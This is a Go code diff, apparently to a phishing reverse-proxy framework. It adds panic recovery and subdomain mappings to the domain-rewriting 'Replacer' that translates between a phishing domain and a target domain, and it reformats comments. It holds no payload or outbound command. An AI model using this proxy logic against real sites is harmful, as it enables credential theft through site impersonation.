@@ -42,8 +42,16 @@ type Base64 struct {
 // TODO: the b64 can be set into the Replacer struct
 func (r *Replacer) Transform(input string, forward bool, b64 Base64, repetitions ...int) (result string) {
 
-	source := strings.TrimSpace(input)
-	if source == "" {
+	// Panic recovery
+	defer func() {
+		if err := recover(); err != nil {
+			log.Warning("Recovered from panic: %s", err)
+		}
+	}()
+
+	// source := strings.TrimSpace(input)
+	source := input
+	if strings.TrimSpace(input) == "" {
 		return source
 	}
 
@@ -281,7 +289,7 @@ func (r *Replacer) PatchComposedWildcardURL(URL string) (result string) {
 		if strings.Contains(result, r.Phishing+"/") {
 			path = "/" + strings.Split(result, r.Phishing+"/")[1]
 		}
-		//wildcard = strings.TrimSuffix(wildcard, fmt.Sprintf(".%s", r.Phishing))
+		// wildcard = strings.TrimSuffix(wildcard, fmt.Sprintf(".%s", r.Phishing))
 
 		domain := fmt.Sprintf("%s.%s", subdomain, r.patchWildcard(wildcard))
 		log.Info("Wildcard to patch: %s (%s)", tui.Bold(tui.Red(result)), tui.Green(domain))
@@ -298,10 +306,10 @@ func (r *Replacer) PatchComposedWildcardURL(URL string) (result string) {
 			return
 		}
 
-		//origins := r.GetOrigins()
-		//if sub, ok := origins[domain]; ok {
+		// origins := r.GetOrigins()
+		// if sub, ok := origins[domain]; ok {
 		//	log.Info("%s is mapped to %s", tui.Bold(tui.Red(domain)), tui.Green(sub))
-		//}
+		// }
 
 		if err := r.Save(); err != nil {
 			log.Error("Error saving replacer: %s", err)
@@ -332,7 +340,7 @@ func transformBase64(input string, b64 Base64, decode bool, padding rune) (outpu
 				}
 			}
 		} else {
-			//encode
+			// encode
 			return base64Encode(input, padding), base64Found, padding
 		}
 	}
@@ -447,7 +455,7 @@ func (r *Replacer) patchWildcardList(rep []string) (prep []string) {
 		wildcard := strings.Split(s, CustomWildcardSeparator)[1]
 		wildcard = strings.Split(wildcard, "/")[0]
 
-		//domain := r.patchWildcard(s)
+		// domain := r.patchWildcard(s)
 		domain := fmt.Sprintf("%s.%s", subdomain, r.patchWildcard(wildcard))
 		if domain != "" {
 			prep = append(prep, domain)
@@ -493,6 +501,14 @@ func (r *Replacer) MakeReplacements() {
 	r.SetForwardReplacements([]string{})
 	r.SetForwardReplacements(append(r.ForwardReplacements, []string{r.Phishing, r.Target}...))
 
+	// Add the SubdomainMap to the forward replacements
+	for _, sub := range r.SubdomainMap {
+		from := fmt.Sprintf("%s.%s", sub, r.Phishing)
+		to := fmt.Sprintf("%s.%s", sub, r.Target)
+		rep := []string{from, to}
+		r.SetForwardReplacements(append(r.ForwardReplacements, rep...))
+	}
+
 	log.Verbose("[Forward | Origins]: %d", len(origins))
 	count := len(r.ForwardReplacements)
 	for extOrigin, subMapping := range origins { // changes resource-1.phishing.
@@ -530,6 +546,14 @@ func (r *Replacer) MakeReplacements() {
 	r.SetBackwardReplacements([]string{})
 	r.SetBackwardReplacements(append(r.BackwardReplacements, []string{r.Target, r.Phishing}...))
 
+	// Add the SubdomainMap to the backward replacements
+	for _, sub := range r.SubdomainMap {
+		from := fmt.Sprintf("%s.%s", sub, r.Target)
+		to := fmt.Sprintf("%s.%s", sub, r.Phishing)
+		rep := []string{from, to}
+		r.SetBackwardReplacements(append(r.BackwardReplacements, rep...))
+	}
+
 	count = 0
 	for include, subMapping := range origins {
 
@@ -562,10 +586,10 @@ func (r *Replacer) MakeReplacements() {
 	// These should be done as Final replacements
 	r.SetLastBackwardReplacements([]string{})
 
-	// Custom HTTP response replacements
+	// CustomContent HTTP response replacements
 	for _, tr := range r.CustomResponseTransformations {
 		r.SetLastBackwardReplacements(append(r.LastBackwardReplacements, tr...))
-		log.Verbose("[Custom Replacements] %+v", tr)
+		log.Verbose("[CustomContent Replacements] %+v", tr)
 	}
 
 	r.SetLastBackwardReplacements(append(r.BackwardReplacements, r.LastBackwardReplacements...))
@@ -574,7 +598,7 @@ func (r *Replacer) MakeReplacements() {
 
 func (r *Replacer) DomainMapping() (err error) {
 	baseDom := r.Target
-	//log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))
+	// log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))
 
 	origins := make(map[string]string)
 	r.WildcardMapping = make(map[string]string)
@@ -603,14 +627,14 @@ func (r *Replacer) DomainMapping() (err error) {
 			o := fmt.Sprintf("%s%d", prefix, wildcards)
 			r.SetWildcardDomain(o)
 			r.SetWildcardMapping(domain, o)
-			//log.Debug(fmt.Sprintf("*.%s=%s", domain, o))
+			// log.Debug(fmt.Sprintf("*.%s=%s", domain, o))
 
 		} else {
 			count++
 			// Extra domains or nested subdomains
 			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
 			origins[domain] = o
-			//log.Debug(fmt.Sprintf("%s=%s", domain, o))
+			// log.Debug(fmt.Sprintf("%s=%s", domain, o))
 		}
 
 	}
@@ -620,6 +644,6 @@ func (r *Replacer) DomainMapping() (err error) {
 	}
 
 	r.SetOrigins(origins)
-	//log.Verbose("Processed %d domains to transform, %d are wildcards", count, wildcards)
+	// log.Verbose("Processed %d domains to transform, %d are wildcards", count, wildcards)
 	return
 }
